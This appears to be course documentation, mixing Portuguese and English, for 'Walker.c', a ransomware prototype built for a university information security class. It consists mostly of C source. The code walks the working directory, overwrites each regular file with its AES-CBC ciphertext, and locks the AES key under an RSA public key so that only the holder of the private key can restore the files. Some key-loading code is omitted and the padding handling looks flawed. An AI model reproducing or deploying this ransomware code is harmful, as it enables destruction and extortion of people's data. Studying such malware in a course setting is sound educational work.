# Walker.c: Technical Scientific Documentation

## 1. Introduction

O presente documento descreve a estrutura, funcionamento e aspectos técnicos do software **Walker.c**, um protótipo de ransomware desenvolvido para fins exclusivamente educacionais no âmbito da disciplina **ES502 - Segurança da Informação** do curso de Engenharia Eletrônica da **Universidade Federal de Pernambuco (UFPE)**.

O projeto visa a exploração aplicada de técnicas criptográficas modernas, incluindo criptografia simétrica (**AES**) e assimétrica (**RSA**), bem como conceitos de segurança ofensiva e engenharia reversa. 

## 2. Functional Objective

O binário gerado pelo projeto realiza encryption and decryption operations on files do diretório de execução. As operações são:

- `--encode` ou `-e`: encrypts the files do diretório atual.
- `--decode` ou `-d`: requests a private RSA key e reverte os arquivos ao estado original.
- `--help` ou `-h`: displays help.

## 3. File Selection

A seleção dos arquivos é realizada pela função `walk`, definida em `FileHandler.c`. Apenas arquivos regulares são processados, utilizando a função `stat` e o macro `S_ISREG`. Diretórios, arquivos ocultos (prefixados por ".") e outros tipos de entrada são descartados:

```c
if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
    if (encrypt)
        infect(path);
    else
        clean(path, rsa);
}
```

## 4. Modular Architecture

A arquitetura do sistema é modular, conforme a seguinte organização:

```
src/
├── main.c                 # Program Entry Point
├── FileHandler/           # File Handling
│   ├── FileHandler.c
│   └── FileHandler.h
├── encryption/
│   ├── encryption.h       # Unified Header
│   ├── AES/
│   │   ├── AES.c
│   │   └── AES.h
│   └── RSA/
│       ├── RSA.c
│       └── RSA.h
├── keys/                  # Key Storage
│   ├── AES.key
│   └── public_key.key
└── ransom.key             # Private RSA Key
```

## 5. Program Behavior

### 5.1. `main.c`

Realiza o parsing de argumentos com `getopt_long`, definindo a operação:

```c
static struct option long_options[] = {
    {"encode", no_argument, 0, 'e'},
    {"decode", no_argument, 0, 'd'},
    {"help",   no_argument, 0, 'h'},
    {0, 0, 0, 0}
};
```

Fluxo principal:

```c
switch (opt) {
    case 'e':
        walk(1, NULL);
        RSA_encrypt();
        break;
    case 'd':
        rsa = fopen("ransom.key", "rb");
        walk(0, rsa);
        RSA_decrypt(rsa);
        break;
    case 'h':
    default:
        usage(argv[0]);
}
```

### 5.2. `FileHandler.c`

#### Function `walk`

Recursively traverses the files in the execution directory:

```c
void walk(int encrypt, FILE *rsa) {
    DIR *dir = opendir(".");
    struct dirent *entry;
    struct stat info;
    char path[4096];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.')
            continue;

        snprintf(path, sizeof(path), "./%s", entry->d_name);
        if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
            if (encrypt)
                infect(path);
            else
                clean(path, rsa);
        }
    }
    closedir(dir);
}
```

#### Funções `infect` e `clean`

```c
void infect(char *filename) {
    encryptFile(filename, "keys/AES.key");
}

void clean(char *filename, FILE *rsa) {
    decryptFile(filename, "keys/AES.key");
}
```

### 5.3. `AES.c`

#### `encryptFile`

```c
void encryptFile(const char *filename, const char *keyfile) {
    FILE *f = fopen(filename, "rb");
    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    rewind(f);

    uint8_t *plaintext = malloc(filesize);
    fread(plaintext, 1, filesize, f);
    fclose(f);

    // Carrega chave AES e IV (omitido)

    uint8_t *ciphertext = malloc(filesize + AES_BLOCKLEN);
    AES_CBC_encrypt_buffer(&aes, ciphertext, plaintext, filesize);

    f = fopen(filename, "wb");
    fwrite(ciphertext, 1, filesize, f);
    fclose(f);

    free(plaintext);
    free(ciphertext);
}
```

#### `decryptFile`

```c
void decryptFile(const char *filename, const char *keyfile) {
    FILE *f = fopen(filename, "rb");
    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    rewind(f);

    uint8_t *ciphertext = malloc(filesize);
    fread(ciphertext, 1, filesize, f);
    fclose(f);

    // Carrega chave AES e IV (omitido)

    uint8_t *plaintext = malloc(filesize);
    AES_CBC_decrypt_buffer(&aes, plaintext, ciphertext, filesize);

    f = fopen(filename, "wb");
    fwrite(plaintext, 1, filesize, f);
    fclose(f);

    free(plaintext);
    free(ciphertext);
}
```

### 5.4. `RSA.c`

#### `RSA_encrypt`

```c
void RSA_encrypt() {
    FILE *aesFile = fopen("keys/AES.key", "rb");
    FILE *pubFile = fopen("keys/public_key.key", "rb");

    RSA *rsa = PEM_read_RSA_PUBKEY(pubFile, NULL, NULL, NULL);

    fread(key, 1, AES_KEYLEN, aesFile);
    RSA_public_encrypt(AES_KEYLEN, key, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);

    FILE *out = fopen("keys/AES.enc", "wb");
    fwrite(encrypted, 1, rsa_len, out);
}
```

#### `RSA_decrypt`

```c
void RSA_decrypt(FILE *rsaFile) {
    RSA *rsa = PEM_read_RSAPrivateKey(rsaFile, NULL, NULL, NULL);

    FILE *enc = fopen("keys/AES.enc", "rb");
    fread(encrypted, 1, rsa_len, enc);

    RSA_private_decrypt(rsa_len, encrypted, decrypted, rsa, RSA_PKCS1_OAEP_PADDING);

    FILE *out = fopen("keys/AES.key", "wb");
    fwrite(decrypted, 1, AES_KEYLEN, out);
}
```

## 6. Security Considerations

All operations were implemented with an educational focus. O armazenamento da chave AES em disco e a sobrescrita dos arquivos originais representam riscos reais de perda de dados. The use of this code for unauthorized purposes pode configurar crime, conforme legislação vigente.

## 7. Conclusion

Walker.c represents a practical and scientific study da aplicação de criptografia em ataques ransomware. A modularidade do projeto, combinada com técnicas reais de criptografia, permite a compreensão aprofundada do funcionamento desse tipo de software malicioso. 

---

> **Legal Notice:** Este projeto é estritamente educacional. Do not use this software in real systems or with sensitive data.
